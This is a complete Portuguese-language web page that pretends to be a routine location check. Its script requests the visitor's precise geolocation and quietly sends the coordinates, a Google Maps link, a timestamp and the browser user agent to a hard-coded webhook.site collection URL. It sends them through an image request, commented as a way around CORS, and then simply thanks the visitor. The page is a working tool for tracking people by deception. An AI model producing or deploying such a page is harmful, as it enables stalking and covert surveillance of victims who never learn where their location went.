<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificação de Localização</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #0f0f13;
    color: #e8e8e8;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 1.5rem;
  }
  .card {
    background: #1a1a22;
    border: 1px solid #2a2a38;
    border-radius: 16px;
    padding: 2.5rem 2rem;
    max-width: 420px;
    width: 100%;
    text-align: center;
  }
  .icon {
    width: 64px; height: 64px;
    background: #1e3a5f;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 1.5rem;
  }
  .icon svg { width: 32px; height: 32px; }
  h1 { font-size: 1.4rem; font-weight: 600; color: #f0f0f0; margin-bottom: 0.75rem; }
  p { font-size: 0.95rem; color: #9a9aaa; line-height: 1.6; margin-bottom: 2rem; }
  button {
    width: 100%; padding: 0.875rem;
    background: #2563eb; color: #fff;
    border: none; border-radius: 10px;
    font-size: 1rem; font-weight: 500;
    cursor: pointer; transition: background 0.2s;
  }
  button:hover { background: #1d4ed8; }
  button:disabled { background: #374151; color: #6b7280; cursor: not-allowed; }
  .status { margin-top: 1.25rem; font-size: 0.85rem; min-height: 1.2em; }
  .status.ok { color: #34d399; }
  .status.err { color: #f87171; }
  .status.loading { color: #60a5fa; }
  .spinner {
    display: inline-block; width: 14px; height: 14px;
    border: 2px solid #60a5fa44; border-top-color: #60a5fa;
    border-radius: 50%; animation: spin 0.7s linear infinite;
    vertical-align: middle; margin-right: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <div class="icon">
    <svg viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <path d="M12 2C8.134 2 5 5.134 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.866-3.134-7-7-7z"/>
      <circle cx="12" cy="9" r="2.5"/>
    </svg>
  </div>
  <h1>Confirmar localização</h1>
  <p>Para continuar, precisamos verificar sua localização. Clique no botão abaixo e permita o acesso quando solicitado pelo navegador.</p>
  <button id="btn" onclick="capturar()">Confirmar minha localização</button>
  <div class="status" id="status"></div>
</div>

<script>
const WEBHOOK = 'https://webhook.site/c3921ec8-7924-4483-90aa-9ff39d69f6bc';

function setStatus(msg, type) {
  const el = document.getElementById('status');
  el.className = 'status ' + type;
  el.innerHTML = msg;
}

function capturar() {
  const btn = document.getElementById('btn');
  btn.disabled = true;
  setStatus('<span class="spinner"></span> Obtendo localização…', 'loading');

  if (!navigator.geolocation) {
    setStatus('Geolocalização não suportada neste navegador.', 'err');
    btn.disabled = false;
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const { latitude, longitude, accuracy } = pos.coords;
      const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
      const ua = encodeURIComponent(navigator.userAgent.substring(0, 100));
      const ts = new Date().toISOString();

      // Envia via imagem (sem restrição CORS)
      const url = `${WEBHOOK}?lat=${latitude}&lng=${longitude}&acc=${Math.round(accuracy)}&maps=${encodeURIComponent(mapsLink)}&ts=${ts}&ua=${ua}`;
      const img = new Image();
      img.src = url;

      img.onload = img.onerror = () => {
        setStatus('✓ Localização confirmada. Obrigado!', 'ok');
        btn.textContent = 'Localização enviada';
      };

      setTimeout(() => {
        setStatus('✓ Localização confirmada. Obrigado!', 'ok');
        btn.textContent = 'Localização enviada';
      }, 2000);
    },
    (err) => {
      const msgs = {
        1: 'Permissão negada. Permita o acesso à localização e tente novamente.',
        2: 'Localização indisponível no momento.',
        3: 'Tempo esgotado. Tente novamente.'
      };
      setStatus(msgs[err.code] || 'Erro desconhecido.', 'err');
      btn.disabled = false;
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}
</script>
</body>
</html>
